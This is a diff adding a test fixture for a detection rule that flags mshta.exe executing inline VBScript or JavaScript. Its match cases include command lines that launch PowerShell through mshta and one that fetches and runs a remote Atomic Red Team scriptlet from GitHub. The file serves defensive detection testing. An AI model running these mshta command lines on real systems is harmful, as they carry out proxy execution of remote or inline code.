@@ -1,0 +1,14 @@
+rule: proc_creation_mshta_inline_script
+base: {Channel: Microsoft-Windows-Sysmon/Operational, EventID: 1, Image: 'C:\Windows\System32\mshta.exe'}
+match:
+  - name: OTRF vbscript sample
+    event: {CommandLine: 'mshta  vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -command Get-Service sysmon"":close")'}
+  - name: OTRF javascript sample
+    event: {CommandLine: "mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();"}
+  - name: upper-case protocol
+    event: {CommandLine: 'MSHTA.EXE VBScript:CreateObject("WScript.Shell").Run("calc")(window.close)'}
+no_match:
+  - name: local .hta file
+    event: {CommandLine: 'mshta.exe C:\Program Files\Vendor\setup.hta'}
+  - name: protocol string in another binary
+    event: {Image: 'C:\Windows\System32\cmd.exe', CommandLine: 'cmd /c echo javascript:void(0)'}
